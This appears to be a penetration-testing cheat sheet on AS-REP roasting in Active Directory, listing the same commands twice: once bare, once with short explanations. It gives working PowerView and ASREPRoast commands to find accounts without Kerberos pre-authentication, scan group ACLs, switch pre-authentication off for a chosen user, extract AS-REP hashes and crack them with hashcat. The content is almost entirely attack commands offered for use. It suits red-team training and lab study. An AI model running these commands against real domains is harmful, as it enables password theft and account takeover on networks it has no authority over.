# 🟢 AS-REPS Roasting

```
. .\Powerview_dev.ps1
```

### **Enumerating accounts with Kerberos pre-auth disabled**

```
Get-DomainUser -PreauthNotRequired -Verbose
```

```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

**Enumerate permissions for group**

{% code overflow="wrap" %}
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```
{% endcode %}

### **Set pre-auth not required**

```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

### **Request encrypted AS-REP**

```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

### **Enumerate all users with Kerberos pre-auth disabled and request a hash**

```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

**Crack the hash with hashcat**

```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Active Directory Kerberos Enumeration and Modification

#### Enumerating Accounts with Disabled Kerberos Pre-Authentication

First, load the PowerView PowerShell module:

```powershell
. .\Powerview_dev.ps1
```

Then, retrieve all users with pre-authentication not required, using:

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

Or, list only their usernames:

```powershell
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

#### Enumerating Permissions for a Group

To find permissions for a specific group:

```powershell
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match "<groupname>"}
```

For a detailed list:

```powershell
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match "<groupname>"} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Disabling Kerberos Pre-Authentication for a User

Load the PowerView script and run:

```powershell
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Requesting Encrypted AS-REP for a User

After loading the ASREPRoast script:

```powershell
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

#### Roasting Users with Pre-Auth Disabled

To enumerate and roast all users:

```powershell
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

#### Cracking the Hash

Finally, crack the retrieved hash using hashcat:

```bash
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

```
```
